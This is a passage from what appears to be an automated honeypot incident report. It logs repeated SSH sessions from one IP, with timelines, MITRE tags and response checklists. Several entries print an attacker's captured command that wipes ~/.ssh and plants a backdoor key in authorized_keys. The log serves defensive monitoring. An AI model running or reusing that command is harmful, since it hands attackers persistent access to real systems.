| `2026-05-11 21:31:35` | `cowrie.session.params` |
| `2026-05-11 21:31:35` | `cowrie.command.input` |
| `2026-05-11 21:31:35` | `cowrie.command.failed` |
| `2026-05-11 21:31:35` | `cowrie.log.closed` |
| `2026-05-11 21:31:36` | `cowrie.session.params` |
| `2026-05-11 21:31:36` | `cowrie.command.input` |
| `2026-05-11 21:31:36` | `cowrie.session.file_download` |
| `2026-05-11 21:31:36` | `cowrie.log.closed` |
| `2026-05-11 21:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148c88c333c9

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:31 |
| **Last Seen** | 2026-05-11 21:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:31:38` | `cowrie.session.connect` |
| `2026-05-11 21:31:38` | `cowrie.client.version` |
| `2026-05-11 21:31:39` | `cowrie.client.kex` |
| `2026-05-11 21:31:39` | `cowrie.login.success` |
| `2026-05-11 21:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67501d68df95

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:33 |
| **Last Seen** | 2026-05-11 21:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:33:17` | `cowrie.session.connect` |
| `2026-05-11 21:33:17` | `cowrie.client.version` |
| `2026-05-11 21:33:17` | `cowrie.client.kex` |
| `2026-05-11 21:33:18` | `cowrie.login.success` |
| `2026-05-11 21:33:18` | `cowrie.session.params` |
| `2026-05-11 21:33:18` | `cowrie.command.input` |
| `2026-05-11 21:33:18` | `cowrie.command.failed` |
| `2026-05-11 21:33:18` | `cowrie.log.closed` |
| `2026-05-11 21:33:19` | `cowrie.session.params` |
| `2026-05-11 21:33:19` | `cowrie.command.input` |
| `2026-05-11 21:33:19` | `cowrie.session.file_download` |
| `2026-05-11 21:33:19` | `cowrie.log.closed` |
| `2026-05-11 21:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f7824a896d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:33 |
| **Last Seen** | 2026-05-11 21:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:33:21` | `cowrie.session.connect` |
| `2026-05-11 21:33:21` | `cowrie.client.version` |
| `2026-05-11 21:33:22` | `cowrie.client.kex` |
| `2026-05-11 21:33:22` | `cowrie.login.success` |
| `2026-05-11 21:33:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35343f060a8c

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:34 |
| **Last Seen** | 2026-05-11 21:34 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:34:08` | `cowrie.session.connect` |
| `2026-05-11 21:34:08` | `cowrie.client.version` |
| `2026-05-11 21:34:08` | `cowrie.client.kex` |
| `2026-05-11 21:34:09` | `cowrie.login.success` |
| `2026-05-11 21:34:09` | `cowrie.session.params` |
| `2026-05-11 21:34:09` | `cowrie.command.input` |
| `2026-05-11 21:34:09` | `cowrie.command.failed` |
| `2026-05-11 21:34:09` | `cowrie.log.closed` |
| `2026-05-11 21:34:10` | `cowrie.session.params` |
| `2026-05-11 21:34:10` | `cowrie.command.input` |
| `2026-05-11 21:34:10` | `cowrie.session.file_download` |
| `2026-05-11 21:34:10` | `cowrie.log.closed` |
| `2026-05-11 21:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67b45699ccbf

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:34 |
| **Last Seen** | 2026-05-11 21:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:34:13` | `cowrie.session.connect` |
| `2026-05-11 21:34:13` | `cowrie.client.version` |
| `2026-05-11 21:34:13` | `cowrie.client.kex` |
| `2026-05-11 21:34:14` | `cowrie.login.success` |
| `2026-05-11 21:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-796270c8a112

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:34 |
| **Last Seen** | 2026-05-11 21:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:34:57` | `cowrie.session.connect` |
| `2026-05-11 21:34:57` | `cowrie.client.version` |
| `2026-05-11 21:34:57` | `cowrie.client.kex` |
| `2026-05-11 21:34:58` | `cowrie.login.success` |
| `2026-05-11 21:34:59` | `cowrie.session.params` |
| `2026-05-11 21:34:59` | `cowrie.command.input` |
| `2026-05-11 21:34:59` | `cowrie.command.failed` |
| `2026-05-11 21:34:59` | `cowrie.log.closed` |
| `2026-05-11 21:34:59` | `cowrie.session.params` |
| `2026-05-11 21:34:59` | `cowrie.command.input` |
| `2026-05-11 21:34:59` | `cowrie.session.file_download` |
| `2026-05-11 21:34:59` | `cowrie.log.closed` |
| `2026-05-11 21:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5eb8b02c0737

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:35 |
| **Last Seen** | 2026-05-11 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:35:02` | `cowrie.session.connect` |
| `2026-05-11 21:35:02` | `cowrie.client.version` |
| `2026-05-11 21:35:02` | `cowrie.client.kex` |
| `2026-05-11 21:35:03` | `cowrie.login.success` |
| `2026-05-11 21:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b35b55733272

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:35 |
| **Last Seen** | 2026-05-11 21:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:35:49` | `cowrie.session.connect` |
| `2026-05-11 21:35:49` | `cowrie.client.version` |
| `2026-05-11 21:35:49` | `cowrie.client.kex` |
| `2026-05-11 21:35:49` | `cowrie.login.success` |
| `2026-05-11 21:35:50` | `cowrie.session.params` |
| `2026-05-11 21:35:50` | `cowrie.command.input` |
| `2026-05-11 21:35:50` | `cowrie.command.failed` |
| `2026-05-11 21:35:50` | `cowrie.log.closed` |
| `2026-05-11 21:35:50` | `cowrie.session.params` |
| `2026-05-11 21:35:50` | `cowrie.command.input` |
| `2026-05-11 21:35:51` | `cowrie.session.file_download` |
| `2026-05-11 21:35:51` | `cowrie.log.closed` |
| `2026-05-11 21:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01c22f35749d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:35 |
| **Last Seen** | 2026-05-11 21:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:35:53` | `cowrie.session.connect` |
| `2026-05-11 21:35:53` | `cowrie.client.version` |
| `2026-05-11 21:35:53` | `cowrie.client.kex` |
| `2026-05-11 21:35:54` | `cowrie.login.success` |
| `2026-05-11 21:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9c2185be5d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:36 |
| **Last Seen** | 2026-05-11 21:36 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:36:38` | `cowrie.session.connect` |
| `2026-05-11 21:36:38` | `cowrie.client.version` |
| `2026-05-11 21:36:39` | `cowrie.client.kex` |
| `2026-05-11 21:36:39` | `cowrie.login.success` |
| `2026-05-11 21:36:40` | `cowrie.session.params` |
| `2026-05-11 21:36:40` | `cowrie.command.input` |
| `2026-05-11 21:36:40` | `cowrie.command.failed` |
| `2026-05-11 21:36:40` | `cowrie.log.closed` |
| `2026-05-11 21:36:40` | `cowrie.session.params` |
| `2026-05-11 21:36:40` | `cowrie.command.input` |
| `2026-05-11 21:36:41` | `cowrie.session.file_download` |
| `2026-05-11 21:36:41` | `cowrie.log.closed` |
| `2026-05-11 21:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9904389b7cd6

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:36 |
| **Last Seen** | 2026-05-11 21:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:36:43` | `cowrie.session.connect` |
| `2026-05-11 21:36:43` | `cowrie.client.version` |
| `2026-05-11 21:36:43` | `cowrie.client.kex` |
| `2026-05-11 21:36:44` | `cowrie.login.success` |
| `2026-05-11 21:36:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4698564f6425

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:38 |
| **Last Seen** | 2026-05-11 21:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:38:22` | `cowrie.session.connect` |
| `2026-05-11 21:38:22` | `cowrie.client.version` |
| `2026-05-11 21:38:22` | `cowrie.client.kex` |
| `2026-05-11 21:38:23` | `cowrie.login.success` |
| `2026-05-11 21:38:23` | `cowrie.session.params` |
| `2026-05-11 21:38:23` | `cowrie.command.input` |
| `2026-05-11 21:38:23` | `cowrie.command.failed` |
| `2026-05-11 21:38:24` | `cowrie.log.closed` |
| `2026-05-11 21:38:24` | `cowrie.session.params` |
| `2026-05-11 21:38:24` | `cowrie.command.input` |
| `2026-05-11 21:38:24` | `cowrie.session.file_download` |
| `2026-05-11 21:38:24` | `cowrie.log.closed` |
| `2026-05-11 21:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa2072d52e7

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:38 |
| **Last Seen** | 2026-05-11 21:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:38:27` | `cowrie.session.connect` |
| `2026-05-11 21:38:27` | `cowrie.client.version` |
| `2026-05-11 21:38:27` | `cowrie.client.kex` |
| `2026-05-11 21:38:28` | `cowrie.login.success` |
| `2026-05-11 21:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f4b1cb7b9d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:39 |
| **Last Seen** | 2026-05-11 21:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:39:15` | `cowrie.session.connect` |
| `2026-05-11 21:39:15` | `cowrie.client.version` |
| `2026-05-11 21:39:15` | `cowrie.client.kex` |
| `2026-05-11 21:39:15` | `cowrie.login.success` |
| `2026-05-11 21:39:16` | `cowrie.session.params` |
| `2026-05-11 21:39:16` | `cowrie.command.input` |
| `2026-05-11 21:39:16` | `cowrie.command.failed` |
| `2026-05-11 21:39:16` | `cowrie.log.closed` |
| `2026-05-11 21:39:17` | `cowrie.session.params` |
| `2026-05-11 21:39:17` | `cowrie.command.input` |
| `2026-05-11 21:39:17` | `cowrie.session.file_download` |
| `2026-05-11 21:39:17` | `cowrie.log.closed` |
| `2026-05-11 21:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-371b077d370f

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:39 |
| **Last Seen** | 2026-05-11 21:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:39:19` | `cowrie.session.connect` |
| `2026-05-11 21:39:19` | `cowrie.client.version` |
| `2026-05-11 21:39:19` | `cowrie.client.kex` |
| `2026-05-11 21:39:20` | `cowrie.login.success` |
| `2026-05-11 21:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60d97d16645d

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:40 |
| **Last Seen** | 2026-05-11 21:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:40:05` | `cowrie.session.connect` |
| `2026-05-11 21:40:05` | `cowrie.client.version` |
| `2026-05-11 21:40:05` | `cowrie.client.kex` |
| `2026-05-11 21:40:06` | `cowrie.login.success` |
| `2026-05-11 21:40:06` | `cowrie.session.params` |
| `2026-05-11 21:40:06` | `cowrie.command.input` |
| `2026-05-11 21:40:06` | `cowrie.command.failed` |
| `2026-05-11 21:40:06` | `cowrie.log.closed` |
| `2026-05-11 21:40:07` | `cowrie.session.params` |
| `2026-05-11 21:40:07` | `cowrie.command.input` |
| `2026-05-11 21:40:07` | `cowrie.session.file_download` |
| `2026-05-11 21:40:07` | `cowrie.log.closed` |
| `2026-05-11 21:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c67a9c756bda

| Field | Detail |
|---|---|
| **Source IP** | `77.54.41[.]203` |
| **First Seen** | 2026-05-11 21:40 |
| **Last Seen** | 2026-05-11 21:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-11 21:40:09` | `cowrie.session.connect` |
| `2026-05-11 21:40:09` | `cowrie.client.version` |
| `2026-05-11 21:40:10` | `cowrie.client.kex` |
| `2026-05-11 21:40:10` | `cowrie.login.success` |
| `2026-05-11 21:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.54.41[.]203` to AbuseIPDB if not already reported
- [ ] Block `77.54.41[.]203` at perimeter firewall / security group
